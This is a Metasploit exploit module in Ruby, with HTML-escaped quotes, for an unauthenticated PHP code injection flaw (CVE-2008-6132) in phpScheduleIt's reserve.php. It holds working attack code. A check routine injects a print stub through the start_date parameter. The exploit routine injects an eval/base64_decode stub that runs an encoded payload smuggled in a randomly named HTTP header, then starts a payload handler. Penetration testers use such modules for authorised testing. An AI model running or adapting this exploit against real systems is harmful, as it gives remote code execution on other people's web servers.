# $Id: phpscheduleit_start_date.rb 14073 2011-10-26 18:06:12Z sinn3r $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::HttpClient
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039; => &#039;phpScheduleIt PHP reserve.php start_date Parameter Arbitrary Code Injection&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits an arbitrary PHP code execution flaw in the phpScheduleIt
                software. This vulnerability is only exploitable when the magic_quotes_gpc PHP
                option is &#039;off&#039;. Authentication is not required to exploit the bug.
 
                Version 1.2.10 and earlier of phpScheduleIt are affected.
            },
            &#039;Author&#039;         =>
                [
                    &#039;EgiX&#039;,        # Vulnerability Discovery and Exploit
                    &#039;juan vazquez&#039; # Metasploit module
                ],
            &#039;License&#039;        => BSD_LICENSE,
            &#039;Version&#039;        => &#039;$Revision: 14073 $&#039;,
            &#039;References&#039;     =>
                [
                    [&#039;CVE&#039;, &#039;2008-6132&#039;],
                    [&#039;OSVDB&#039;, &#039;48797&#039;],
                    [&#039;BID&#039;, &#039;31520&#039;],
                    [&#039;URL&#039;, &#039;http://www.exploit-db.com/exploits/6646/&#039;],
                ],
            &#039;Privileged&#039;     => false,
            &#039;Platform&#039;       => [&#039;php&#039;],
            &#039;Arch&#039;           => ARCH_PHP,
            &#039;Payload&#039;        =>
                {
                    # max header length for Apache,
                    # http://httpd.apache.org/docs/2.2/mod/core.html#limitrequestfieldsize
                    &#039;Space&#039;       => 8190,
                    &#039;DisableNops&#039; => true,
                    &#039;Keys&#039;        => [&#039;php&#039;],
                },
            &#039;Targets&#039;        => [ [&#039;Automatic&#039;, { }] ],
            &#039;DefaultTarget&#039; => 0,
            &#039;DisclosureDate&#039; => &#039;Oct 1 2008&#039;))
 
        register_options(
            [
                OptString.new(&#039;URI&#039;, [ true,  "The full URI path to phpScheduleIt", &#039;/phpscheduleit&#039;]),
            ], self.class)
    end
 
    def check
        signature = rand_text_alpha(rand(10)+10)
        stub = "1&#039;).${print(&#039;#{signature}&#039;)}.${die};#"
        my_payload = "btnSubmit=1&start_date=#{stub}"
 
        if datastore[&#039;URI&#039;][-1, 1] == "/"
            uri = datastore[&#039;URI&#039;] + "reserve.php"
        else
            uri = datastore[&#039;URI&#039;] + "/reserve.php"
        end
 
        print_status("Checking uri #{uri}")
 
        response = send_request_cgi({
            &#039;method&#039; => "POST",
            &#039;global&#039; => true,
            &#039;uri&#039; => uri,
            &#039;headers&#039; => {
                    &#039;Referer&#039; => uri,
                },
            &#039;data&#039; => "#{my_payload}"
        })
 
        if response.code == 200 and response.body =~ /#{signature}/
            return Exploit::CheckCode::Vulnerable
        end
 
        return Exploit::CheckCode::Safe
    end
 
    def exploit
        headername = "X-" + Rex::Text.rand_text_alpha_upper(rand(10)+10)
        stub = "1&#039;).${error_reporting(0)}.${eval(base64_decode($_SERVER[HTTP_#{headername.gsub("-", "_")}]))};#"
        my_payload = "btnSubmit=1&start_date=#{stub}"
 
        if datastore[&#039;URI&#039;][-1, 1] == "/"
            uri = datastore[&#039;URI&#039;] + "reserve.php"
        else
            uri = datastore[&#039;URI&#039;] + "/reserve.php"
        end
 
        print_status("Sending request for: #{uri}")
        print_status("Payload embedded in header: #{headername}")
 
        response = send_request_cgi({
            &#039;method&#039; => "POST",
            &#039;global&#039; => true,
            &#039;uri&#039; => uri,
            &#039;headers&#039; => {
                    headername  => Rex::Text.encode_base64(payload.encoded),
                    &#039;Referer&#039;   => uri
                },
            &#039;data&#039; => "#{my_payload}"
        }, 3)
 
        if response and response.code != 200
            print_error("Server returned a non-200 status code: (#{response.code})")
        end
 
        handler
    end
end



